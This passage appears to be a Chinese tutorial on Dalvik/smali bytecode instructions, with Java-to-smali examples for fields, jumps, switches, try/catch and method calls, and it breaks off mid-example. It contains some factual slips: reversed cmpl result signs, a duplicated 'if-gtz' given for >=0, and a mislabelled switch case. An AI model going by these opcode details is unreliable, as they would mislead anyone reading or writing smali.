\u5728\u5bc4\u5b58\u5668\u8fde\u7eed\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd8\u53ef\u4ee5\u5199\u6210\u5982\u4e0b\u4ee3\u7801 const/4 v1 , 0x1 const/4 v2 , 0x2 const/4 v3 , 0x3 const/4 v4 , 0x4 const/4 v5 , 0x5 filled-new-array-range { v1 .. v5 }, I move-result v0 \u5b9e\u4f8b\u64cd\u4f5c\u6307\u4ee4 \u00b6 \u5b9e\u4f8b\u64cd\u4f5c\u6307\u4ee4\u4e3b\u8981\u5b9e\u73b0\u4e86\u5b9e\u4f8b\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u68c0\u67e5\u53ca\u65b0\u5efa\u7b49\u529f\u80fd\u3002 \u6307\u4ee4 \u8bf4\u660e check-cast vAA, type@BBBB \u5c06vAA\u5bc4\u5b58\u5668\u4e2d\u7684\u5bf9\u8c61\u5f15\u7528\u8f6c\u6362\u6210type@BBBB\u7c7b\u578b\uff0c\u5982\u679c\u5931\u8d25\u7684\u8bdd\uff0c\u629b\u51faClassCastException\u5f02\u5e38\u3002\u5982\u679c\u7c7b\u578bB\u6307\u5b9a\u7684\u662f\u57fa\u672c\u7c7b\u578b\uff0c\u5bf9\u4e8e\u975e\u57fa\u672c\u7c7b\u578b\u7684A\u6765\u8bf4\uff0c\u8fd0\u884c\u65f6\u59cb\u7ec8\u4f1a\u5931\u8d25 instance-of vA, vB, type@CCCC \u5224\u65advB\u5bc4\u5b58\u5668\u4e2d\u7684\u5bf9\u8c61\u5f15\u7528\u662f\u5426\u53ef\u4ee5\u8f6c\u6362\u6210\u6307\u5b9a\u7684\u7c7b\u578b\uff0c\u5982\u679c\u53ef\u4ee5\uff0cvA\u5bc4\u5b58\u5668\u88ab\u8d4b\u503c\u4e3a1\uff0c\u5426\u5219vA\u5bc4\u5b58\u5668\u88ab \u8d4b\u503c\u4e3a0\u3002 new-instance vAA, type@BBBB \u6784\u9020\u4e00\u4e2a\u6307\u5b9a\u7c7b\u578b\u5bf9\u8c61\u7684\u65b0\u5b9e\u4f8b\uff0c\u5e76\u5c06\u5bf9\u8c61\u5f15\u7528\u8d4b\u503c\u7ed9vAA\u5bc4\u5b58\u5668\uff0c\u7c7b\u578b\u7b26type\u6307\u5b9a\u7684\u7c7b\u578b\u4e0d\u80fd\u662f\u6570\u7ec4\u7c7b check-cast/jumbo vAAAA, type@BBBBBBBB \u529f\u80fd\u4e0echeck-cast vAA, type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 instance-of/jumbo vAAAA, vBBBB, type@CCCCCCCC \u529f\u80fd\u4e0einstance-of vA, vB, type@CCCC\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 new-instance/jumbo vAAAA, type@BBBBBBBB \u529f\u80fd\u4e0enew-instance vAA, type@BBBB\u76f8\u540c\uff0c\u53ea\u662f\u5bc4\u5b58\u5668\u503c\u4e0e\u6307\u4ee4\u7684\u7d22\u5f15\u53d6\u503c\u8303\u56f4\u66f4\u5927\uff08Android4.0\u4e2d\u65b0\u589e\u7684\u6307\u4ee4\uff09 \u6bd4\u5982\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5b9e\u4f8b Object obj = new Object (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b new-instance v0 , L java/lang/ Object ; invoke-direct-empty { v0 }, L java/lang/ Object ; -> <init> () V \u518d\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u7684\u7c7b\u578b\u5224\u65ad String s = \"test\" ; boolean b = s instanceof String ; \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const-string v0 , \"test\" instance-of v1 , v0 , L java/lang/ String ; \u5982\u679c\u6211\u4eec\u8fdb\u884c\u7c7b\u578b\u7684\u5f3a\u5236\u8f6c\u6362 String s = \"test\" ; Object o = ( Object ) s ; \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const-string v0 , \"test\" check-cast v0 , L java/lang/ Object ; move-object v1 , v0 \u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4 \u00b6 \u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u4e3b\u8981\u662f\u5bf9\u5b9e\u4f8b\u7684\u5b57\u6bb5\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\u3002\u5176\u4e2d\u8bfb\u64cd\u4f5c\u4f7f\u7528get\u6765\u6807\u8bb0\uff0c\u5373vx=vy.field\u3002\u5199\u64cd\u4f5c\u4f7f\u7528put\u6765\u6807\u8bb0\uff0c\u5373vy.field=vx\u3002 \u5176\u4e2d\u5bf9\u4e8ejava\u4e2d\u7684\u7c7b\u6765\u8bf4\uff0c\u4e3b\u8981\u5206\u4e3a\u4e24\u79cd\u5b57\u6bb5\uff0c\u666e\u901a\u5b57\u6bb5\uff0c\u9759\u6001\u5b57\u6bb5\u3002\u5bf9\u4e8e\u666e\u901a\u5b57\u6bb5\u91c7\u7528\u64cd\u4f5c\u6307\u4ee4\u524d\u52a0i\u6765\u6807\u8bb0\uff0c\u5982iget\uff0ciput\u3002\u5bf9\u4e8e\u9759\u6001\u5b57\u6bb5\u91c7\u7528\u5728\u64cd\u4f5c\u6307\u4ee4\u524d\u52a0s\u6765\u6807\u8bb0\uff0c\u5982sput\uff0csget\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e\u4e0d\u540c\u5b57\u6bb5\u5927\u5c0f\u7684\u64cd\u4f5c\u4f1a\u5728\u6307\u4ee4\u7684\u540e\u9762\u52a0\u4e0a\u540e\u7f00\u6765\u8fdb\u884c\u533a\u522b\u3002\u5982 iget-byte\u6307\u4ee4\u8868\u793a\u8bfb\u53d6\u7c7b\u578b\u4e3a\u5b57\u8282\u7684\u5b9e\u4f8b\u5b57\u6bb5\u7684\u503c\uff0ciput-short\u6307\u4ee4\u8868\u793a\u8bbe\u7f6e\u7684\u5b9e\u4f8b\u5b57\u6bb5\u7684\u7c7b\u578b\u4e3a\u77ed\u6574\u578b\u3002 \u666e\u901a\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u6709\uff1a iget\uff0ciget-wide\uff0ciget-object\uff0ciget-boolean\uff0ciget-byte\uff0ciget-char\uff0ciget-short\uff0c iput\uff0ciput-wide\uff0ciput-object\uff0ciput-boolean\uff0ciput-byte\uff0ciput-char\uff0ciput-short\u3002 \u9759\u6001\u5b57\u6bb5\u64cd\u4f5c\u6307\u4ee4\u6709\uff1a sget\uff0csget-wide\uff0csget-object\uff0csget-boolean\uff0csget-byte\uff0csget-char\uff0csget-short\uff0c sput\uff0csput-wide\uff0csput-object\uff0csput-boolean\uff0csput-byte\uff0csput-char\uff0csput-short\u3002 \u5982\u679c\u6211\u4eec\u7f16\u5199\u5982\u4e0b\u4ee3\u7801 int [] arr = new int [ 2 ]; int b = arr [ 0 ]; arr [ 1 ] = b ; \u5176\u5bf9\u5e94\u7684smali\u5982\u4e0b const/4 v0 , 0x2 new-array v1 , v0 , I const/4 v0 , 0x0 aget-int v2 , v1 , v0 const/4 v0 , 0x1 aput-int v2 , v1 , v0 \u5982\u679c\u6211\u4eec\u60f3\u83b7\u5f97\u7c7bcom.example.test\u7684\u9759\u6001int\u7c7b\u578b\u7684\u5b57\u6bb5staticField\uff0c\u5176smali\u5982\u4e0b sget v0 , L com/example/ Test ; -> staticField : I \u6bd4\u8f83\u6307\u4ee4 \u00b6 \u6bd4\u8f83\u6307\u4ee4\u5b9e\u73b0\u4e86\u5bf9\u4e24\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff08\u6d6e\u70b9\u578b\u6216\u957f\u6574\u578b\uff09\u8fdb\u884c\u6bd4\u8f83\u7684\u64cd\u4f5c\u3002 \u5176\u683c\u5f0f\u4e3acmp(l/g)-kind vAA, vBB, vCC\uff0c\u5176\u4e2dvBB\u5bc4\u5b58\u5668\u4e0evCC\u5bc4\u5b58\u5668\u662f\u9700\u8981\u6bd4\u8f83\u7684\u4e24\u4e2a\u5bc4\u5b58\u5668\u6216\u5bc4\u5b58\u5668\u5bf9\uff0c\u6bd4\u8f83\u7684\u7ed3\u679c\u653e\u5230vAA\u5bc4\u5b58\u5668\u3002 l\u2192less g\u2192 great \u76ee\u524d\u7684\u6bd4\u8f83\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e cmpl-float \u6bd4\u8f83\u4e24\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u7ed3\u679c\u4e3a-1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\u7ed3\u679c\u4e3a1 cmpg-float \u6bd4\u8f83\u4e24\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\u7ed3\u679c\u4e3a-1 cmpl-double \u6bd4\u8f83\u4e24\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5bf9\u5927\u4e8evCC\u5bc4\u5b58\u5668\u5bf9\uff0c\u5219\u7ed3\u679c\u4e3a-1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u5219\u7ed3\u679c\u4e3a1 cmpg-double \u6bd4\u8f83\u4e24\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5bf9\u5927\u4e8evCC\u5bc4\u5b58\u5668\u5bf9\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u4e8e\u7684\u8bdd\uff0c\u5219\u7ed3\u679c\u4e3a-1 cmp-long \u6bd4\u8f83\u4e24\u4e2a\u957f\u6574\u578b\u6570\u3002\u5982\u679cvBB\u5bc4\u5b58\u5668\u5927\u4e8evCC\u5bc4\u5b58\u5668\uff0c\u5219\u7ed3\u679c\u4e3a1\uff0c\u76f8\u7b49\u5219\u7ed3\u679c\u4e3a0\uff0c\u5c0f\u5219\u7ed3\u679c\u4e3a-1 \u8df3\u8f6c\u6307\u4ee4 \u00b6 \u8df3\u8f6c\u6307\u4ee4\u5b9e\u73b0\u4e86\u4ece\u5f53\u524d\u5730\u5740\u8df3\u8f6c\u5230\u6307\u5b9a\u7684\u504f\u79fb\u5904\u7684\u64cd\u4f5c\u3002Dalvik\u6307\u4ee4\u96c6\u4e2d\u6709\u4e09\u79cd\u8df3\u8f6c\u6307\u4ee4 goto\uff0c\u65e0\u6761\u4ef6\u8df3\u8f6c switch\uff0c\u5206\u652f\u8df3\u8f6c if\uff0c\u6761\u4ef6\u8df3\u8f6c goto\u6307\u4ee4 \u00b6 \u5982\u4e0b \u6307\u4ee4 \u542b\u4e49 goto +AA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904\uff0c\u504f\u79fb\u91cfAA\u4e0d\u80fd\u4e3a0 goto/16 +AAAA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904\uff0c\u504f\u79fb\u91cfAAAA\u4e0d\u80fd\u4e3a0 goto/32 +AAAAAAAA \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230\u6307\u5b9a\u504f\u79fb\u5904 if\u6307\u4ee4 \u00b6 if\u6307\u4ee4\u4e2d\u4e3b\u8981\u5206\u4e3a\u4e24\u79cdif-test\u4e0eif-testz\u3002 if-test vA,vB,+CCCC \u4f1a\u6bd4\u8f83vA\u4e0ev\uff0c\u5982\u679c\u6bd4\u8f83\u7ed3\u679c\u6ee1\u8db3\u5c31\u8df3\u8f6c\u5230CCCC\u6307\u5b9a\u7684\u504f\u79fb\u5904\uff08\u76f8\u5bf9\u5f53\u524d\u504f\u79fb\uff09\uff0c\u504f\u79fb\u91cfCCCC\u4e0d\u80fd\u4e3a0\u3002if-test\u7c7b\u578b\u7684\u6307\u4ee4\u5982\u4e0b\uff1a \u6307\u4ee4 \u8bf4\u660e if-eq vA,vB,target \u5982\u679cvA=vB\uff0c\u8df3\u8f6c\u3002 if-ne vA,vB,target \u5982\u679cvA!=vB\uff0c\u8df3\u8f6c\u3002 if-lt vA,vB,target \u5982\u679cvA<vB\uff0c\u8df3\u8f6c\u3002 if-gt vA,vB,target \u5982\u679cvA>vB\uff0c\u8df3\u8f6c\u3002 if-ge vA,vB,target \u5982\u679cvA>=vB\uff0c\u8df3\u8f6c\u3002 if-le vA,vB,target \u5982\u679cvA<=vB\uff0c\u8df3\u8f6c\u3002 if-testz\u7c7b\u578b\u7684\u6307\u4ee4\u5982\u4e0b \u6307\u4ee4 \u8bf4\u660e if-eqz vAA,target \u5982\u679cvA=0\uff0c\u8df3\u8f6c\u3002 if-nez vAA,target \u5982\u679cvA!=0\uff0c\u8df3\u8f6c\u3002 if-ltz vAA,target \u5982\u679cvA<0\uff0c\u8df3\u8f6c\u3002 if-gtz vAA,target \u5982\u679cvA>0\uff0c\u8df3\u8f6c\u3002 if-lez vAA,target \u5982\u679cvA<=0\uff0c\u8df3\u8f6c\u3002 if-gtz vAA,target \u5982\u679cvA>=0\uff0c\u8df3\u8f6c\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0cjava\u4ee3\u7801\u5982\u4e0b int a = 10 if ( a > 0 ) a = 1 ; else a = 0 ; smali\u4ee3\u7801\u5982\u4e0b const/4 v0 , 0xa if-lez v0 , :cond_0 # if \u5757\u5f00\u59cb const/4 v0 , 0x1 goto :cond_1 # if \u5757\u7ed3\u675f :cond_0 # else \u5757\u5f00\u59cb const/4 v0 , 0x0 :cond_1 # else \u5757\u7ed3\u675f \u5728\u53ea\u6709if\u7684\u60c5\u51b5\u4e0b int a = 10 ; if ( a > 0 ) a = 1 ; smali\u4ee3\u7801\u5982\u4e0b const/4 v0 , 0xa if-lez v0 , :cond_0 # if \u5757\u5f00\u59cb const/4 v0 , 0x1 :cond_0 # if \u5757\u7ed3\u675f switch\u6307\u4ee4 \u00b6 \u5982\u4e0b \u6307\u4ee4 \u542b\u4e49 packed-switch vAA,+BBBBBBBB vAA\u5bc4\u5b58\u5668\u4e3aswitch\u5206\u652f\u4e2d\u9700\u8981\u5224\u65ad\u7684\u503c\uff0cBBBBBBBB\u6307\u5411\u4e00\u4e2apacked-switch-payload\u683c\u5f0f\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u6709\u89c4\u5f8b\u9012\u589e\u7684\u3002 sparse-switch vAA,+BBBBBBBB vAA\u5bc4\u5b58\u5668\u4e3aswitch\u5206\u652f\u4e2d\u9700\u8981\u5224\u65ad\u7684\u503c\uff0cBBBBBBBB\u6307\u5411\u4e00\u4e2asparse-switch-payload\u683c\u5f0f\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u65e0\u89c4\u5f8b\u7684\u504f\u79fb\u8868\uff0c\u8868\u4e2d\u7684\u503c\u662f\u65e0\u89c4\u5f8b\u7684\u504f\u79fb\u91cf\u3002 \u5bf9\u4e8e\u7b2c\u4e00\u79cd\u9012\u589e\u5f0f\u7684switch\uff0c\u5982\u4e0b int a = 10 ; switch ( a ){ case 0 : a = 1 ; break ; case 1 : a = 5 ; break ; case 2 : a = 10 ; break ; case 3 : a = 20 ; break ; } \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa packed-switch v0 , :pswitch_data_0 # switch \u5f00\u59cb :pswitch_0 # case 0 const/4 v0 , 0x1 goto :goto_0 :pswitch_1 # case 1 const/4 v0 , 0x5 goto :goto_0 :pswitch_2 # case 2 const/16 v0 , 0xa goto :goto_0 :pswitch_3 # case 3 const/16 v0 , 0x14 goto :goto_0 :goto_0 # switch \u7ed3\u675f return-void :pswitch_data_0 # \u8df3\u8f6c\u8868\u5f00\u59cb .packed-switch 0x0 # \u4ece 0 \u5f00\u59cb :pswitch_0 :pswitch_1 :pswitch_2 :pswitch_3 .end packed-switch # \u8df3\u8f6c\u8868\u7ed3\u675f \u5bf9\u4e8e\u975e\u9012\u589e\u7684switch\uff0c\u4ee3\u7801\u5982\u4e0b int a = 10 ; switch ( a ){ case 0 : a = 1 ; break; case 10 : a = 5 ; break; case 20 : a = 10 ; break; case 30 : a = 20 ; break; } \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa sparse-switch v0 , :sswitch_data_0 # switch \u5f00\u59cb :sswitch_0 # case 0 const/4 v0 , 0x1 goto :goto_0 :sswitch_1 # case 10 const/4 v0 , 0x5 goto :goto_0 :sswitch_2 # case 20 const/16 v0 , 0xa goto :goto_0 :sswitch_3 # case 15 const/16 v0 , 0x14 goto :goto_0 :goto_0 # switch \u7ed3\u675f return-void .line 55 :sswitch_data_0 # \u8df3\u8f6c\u8868\u5f00\u59cb .sparse-switch 0x0 -> :sswitch_0 0xa -> :sswitch_1 0x14 -> :sswitch_2 0x1e -> :sswitch_3 .end sparse-switch # \u8df3\u8f6c\u8868\u7ed3\u675f \u9501\u6307\u4ee4 \u00b6 \u9501\u6307\u4ee4\u7528\u4e8e\u5728\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u3002\u5305\u542b\u4ee5\u4e0b\u4e24\u4e2a\u6307\u4ee4 \u6307\u4ee4 \u8bf4\u660e monitor-enter vAA \u4e3a\u6307\u5b9a\u7684\u5bf9\u8c61\u83b7\u53d6\u9501 monitor-exit vAA \u91ca\u653e\u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u9501 \u65b9\u6cd5\u8c03\u7528\u6307\u4ee4 \u00b6 \u65b9\u6cd5\u8c03\u7528\u6307\u4ee4\u5b9e\u73b0\u4e86\u8c03\u7528\u5b9e\u4f8b\u7684\u65b9\u6cd5\u7684\u64cd\u4f5c\u3002\u5176\u57fa\u7840\u4e3ainvoke\uff0c\u5728\u5176\u57fa\u7840\u4e0a\u4f1a\u6839\u636e\u8c03\u7528\u65b9\u6cd5\u7684\u7c7b\u522b\u4e0d\u540c\uff0c\u5982\u865a\u65b9\u6cd5\uff0c\u7236\u7c7b\u65b9\u6cd5\u7b49\u6dfb\u52a0\u540e\u7f00\uff0c\u6700\u540e\u4f1a\u9009\u62e9\u6027\u5730\u4f7f\u7528range\u6765\u6307\u5b9a\u5bc4\u5b58\u5668\u8303\u56f4\u3002\u4e00\u822c\u6765\u8bf4\u4f1a\u5206\u4e3a\u4e24\u7c7b invoke-kind {vC, vD, vE, vF, vG},meth@BBBB invoke-kind/range {vCCCC .. vNNNN},meth@BBBB\u4e24\u7c7b \u603b\u4f53\u6765\u8bf4\uff0c\u4e00\u822c\u6709\u5982\u4e0b\u6307\u4ee4 \u6307\u4ee4 \u8bf4\u660e invoke-virtual \u6216 invoke-virtual/range \u8c03\u7528\u5b9e\u4f8b\u7684\u865a\u65b9\u6cd5 invoke-super \u6216 invoke-super/range \u8c03\u7528\u5b9e\u4f8b\u7684\u7236\u7c7b\u65b9\u6cd5 invoke-direct \u6216 invoke-direct/range \u8c03\u7528\u5b9e\u4f8b\u7684\u76f4\u63a5\u65b9\u6cd5 invoke-static \u6216 invoke-static/range \u8c03\u7528\u5b9e\u4f8b\u7684\u9759\u6001\u65b9\u6cd5 invoke-interface \u6216 invoke-interface/range \u8c03\u7528\u5b9e\u4f8b\u7684\u63a5\u53e3\u65b9\u6cd5 Dalvik\u4e2d\u76f4\u63a5\u65b9\u6cd5\u662f\u6307\u7c7b\u7684\u6240\u6709\u5b9e\u4f8b\u6784\u9020\u5668\u548c private \u5b9e\u4f8b\u65b9\u6cd5\uff0c\u5bf9\u4e8e protected \u6216\u8005 public \u65b9\u6cd5\u90fd\u53eb\u505a\u865a\u65b9\u6cd5\u3002 \u5f02\u5e38\u6307\u4ee4 \u00b6 \u5229\u7528 throw vAA \u6307\u4ee4\u629b\u51favAA\u5bc4\u5b58\u5668\u4e2d\u6307\u5b9a\u7c7b\u578b\u7684\u5f02\u5e38\u3002 try catch \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0btry catch\uff0c\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } catch ( Exception e ) { a = 0 ; } callAnotherMethod (); \u5bf9\u5e94\u7684smali\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catch L java/lang/ Exception ; { :try_start_0 .. :try_end_0 } :catch_0 :goto_0 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catch_0 # catch \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x0 goto :goto_0 # catch \u5757\u7ed3\u675f \u53ef\u4ee5\u770b\u5230\uff0c :try_start_0 \u548c :try_end_0 \u4e4b\u95f4\u5982\u679c\u5b58\u5728\u5f02\u5e38\uff0c\u5219\u4f1a\u5411\u4e0b\u5bfb\u627e .catch \uff08\u6216\u8005 .catch-all \uff09\u8bed\u53e5\uff0c\u7b26\u5408\u6761\u4ef6\u65f6\u8df3\u5230\u6807\u7b7e\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u662f :catch_0 \uff0c\u7ed3\u675f\u4e4b\u540e\u4f1a\u6709\u4e2a goto \u8df3\u56de\u53bb\u3002 try-finally \u00b6 java\u4ee3\u7801\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } finally { a = 0 ; } callAnotherMethod (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catchall { :try_start_0 .. :try_end_0 } :catchall_0 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230\u5916\u9762 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catchall_0 # finally \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x0 throw v1 # finally \u5757\u7ed3\u675f \u53ef\u4ee5\u770b\u51fa\uff0c\u7531\u4e8e finally \u4e2d\u7684\u903b\u8f91\u65e0\u8bba\u6709\u6ca1\u6709\u5f02\u5e38\u90fd\u4f1a\u6267\u884c\uff0c\u6240\u4ee5\u4ee3\u7801\u91cc\u4e00\u5171\u6709\u4e24\u90e8\u5206\u3002 try-catch-finally \u00b6 \u5f53\u6211\u4eec\u540c\u65f6\u4f7f\u7528catch\u4e0efinally\u65f6\uff0c\u5982\u4e0b int a = 10 ; try { callSomeMethod (); } catch ( Exception e ) { a = 1 ; } finally { a = 0 ; } callAnotherMethod (); \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b const/16 v0 , 0xa :try_start_0 # try \u5757\u5f00\u59cb invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callSomeMethod () V :try_end_0 # try \u5757\u7ed3\u675f .catch L java/lang/ Exception ; { :try_start_0 .. :try_end_0 } :catch_0 .catchall { :try_start_0 .. :try_end_0 } :catchall_0 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230\u5916\u9762 :goto_0 invoke-direct { p0 }, L net/flygon/myapplication/ SubActivity ; -> callAnotherMethod () V return-void :catch_0 # catch \u5757\u5f00\u59cb move-exception v1 const/4 v0 , 0x1 const/4 v0 , 0x0 # \u590d\u5236\u4e00\u4efd\u5230 catch \u5757\u91cc\u9762 goto :goto_0 # catch \u5757\u7ed3\u675f :catchall_0 # finally \u5757\u5f00\u59cb move-exception v2 const/4 v0 , 0x0 throw v2 # finally \u5757\u7ed3\u675f \u8fd4\u56de\u6307\u4ee4 \u00b6 \u5728java\u4e2d\u6211\u4eec\u4f1a\u5229\u7528Return\u8fd4\u56de\u65b9\u6cd5\u7684\u6267\u884c\u7ed3\u679c\u3002\u540c\u6837\u7684\uff0c\u5728Davilk\u4e2d\u6211\u4eec\u4e5f\u9700\u8981return\u6307\u4ee4\u6765\u8fd4\u56de\u65b9\u6cd5\u8fd0\u884c\u7ed3\u679c\u3002 \u6307\u4ee4 \u8bf4\u660e return-void \u4ec0\u4e48\u4e5f\u4e0d\u8fd4\u56de return vAA \u8fd4\u56de\u4e00\u4e2a32\u4f4d\u975e\u5bf9\u8c61\u7c7b\u578b\u7684\u503c return-wide vAA \u8fd4\u56de\u4e00\u4e2a64\u4f4d\u975e\u5bf9\u8c61\u7c7b\u578b\u7684\u503c return-object vAA \u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7c7b\u578b\u7684\u5f15\u7528 java2smali \u00b6 \uff01\uff01\u4ecejava\u4ee3\u7801\u5230smali\u4ee3\u7801\uff01\uff01 \u8be5\u4f8b\u5b50\u6765\u81ea\u4e8e http://blog.csdn.net/dd864140130/article/details/52076515 \u3002 java\u4ee3\u7801\u5982\u4e0b public class MainActivity extends Activity implements View . OnClickListener { private String TAG = \"MainActivity\" ; private static final float pi = ( float ) 3.14 ; public volatile boolean running = false ; @Override protected void onCreate ( Bundle savedInstanceState ) { super . onCreate ( savedInstanceState ); setContentView ( R . layout . activity_main ); } @Override public void onClick ( View view ) { int result = add ( 4 , 5 ); System . out . println ( result ); result = sub ( 9 , 3 ); if ( result > 4 ) { log ( result ); } } public int add ( int x , int y ) { return x + y ; } public synchronized int sub ( int x , int y ) { return x + y ; } public static void log ( int result ) { Log . d ( \"MainActivity\" , \"the result:\" + result ); } } \u5176\u5bf9\u5e94\u7684smali\u4ee3\u7801\u5982\u4e0b #\u6587\u4ef6\u5934\u63cf\u8ff0 .class public L com/social_touch/demo/ MainActivity ; .super L android/app/ Activity ; #\u6307\u5b9aMainActivity\u7684\u7236\u7c7b .source \"MainActivity.java\" #\u6e90\u6587\u4ef6\u540d\u79f0 #\u8868\u660e\u5b9e\u73b0\u4e86View.OnClickListener\u63a5\u53e3 # interfaces .implements L android/view/ View$OnClickListener ; #\u5b9a\u4e49float\u9759\u6001\u5b57\u6bb5pi # static fields .field private static final pi : F = 3.14f #\u5b9a\u4e49\u4e86String\u7c7b\u578b\u5b57\u6bb5TAG # instance fields .field private TAG : L java/lang/ String ; #\u5b9a\u4e49\u4e86boolean\u7c7b\u578b\u7684\u5b57\u6bb5running .field public volatile running : Z #\u6784\u9020\u65b9\u6cd5,\u5982\u679c\u4f60\u8fd8\u7eb3\u95f7\u8fd9\u4e2a\u65b9\u6cd5\u662f\u600e\u4e48\u51fa\u6765\u7684\u5316,\u5c31\u53bb\u770b\u770bjvm\u7684\u57fa\u7840\u77e5\u8bc6\u5427 # direct methods .method public constructor <init> () V .locals 1 #\u8868\u793a\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf .prologue #\u8868\u793a\u65b9\u6cd5\u4e2d\u4ee3\u7801\u6b63\u5f0f\u5f00\u59cb .line 8 #\u8868\u793a\u5bf9\u5e94\u4e0ejava\u6e90\u6587\u4ef6\u7684\u4f4e8\u884c #\u8c03\u7528Activity\u4e2d\u7684init()\u65b9\u6cd5 invoke-direct { p0 }, L android/app/ Activity ; -> <init> () V .line 10 const-string v0 , \"MainActivity\" iput-object v0 , p0 , L com/social_touch/demo/ MainActivity ; -> TAG : L java/lang/ String ; .line 13 const/4 v0 , 0x0 iput-boolean v0 , p0 , L com/social_touch/demo/ MainActivity ; -> running : Z return-void .end method #\u9759\u6001\u65b9\u6cd5log() .method public static log ( I ) V .locals 3 .parameter \"result\" #\u8868\u793aresult\u53c2\u6570 .prologue .line 42 #v0\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3a\"MainActivity\" const-string v0 , \"MainActivity\" #\u521b\u5efaStringBuilder\u5bf9\u8c61,\u5e76\u5c06\u5176\u5f15\u7528\u8d4b\u503c\u7ed9v1\u5bc4\u5b58\u5668 new-instance v1 , L java/lang/ StringBuilder ; #\u8c03\u7528StringBuilder\u4e2d\u7684\u6784\u9020\u65b9\u6cd5 invoke-direct { v1 }, L java/lang/ StringBuilder ; -> <init> () V #v2\u5bc4\u5b58\u5668\u4e2d\u8d4b\u503c\u4e3ather result: const-string v2 , \"the result:\" #{v1,v2}\u5927\u62ec\u53f7\u4e2dv1\u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8\u7684\u662fStringBuilder\u5bf9\u8c61\u7684\u5f15\u7528. #\u8c03\u7528StringBuilder\u4e2d\u7684append(String str)\u65b9\u6cd5,v2\u5bc4\u5b58\u5668\u5219\u662f\u53c2\u6570\u5bc4\u5b58\u5668. invoke-virtual { v1 , v2 }, L java/lang/ StringBuilder ; -> append ( L 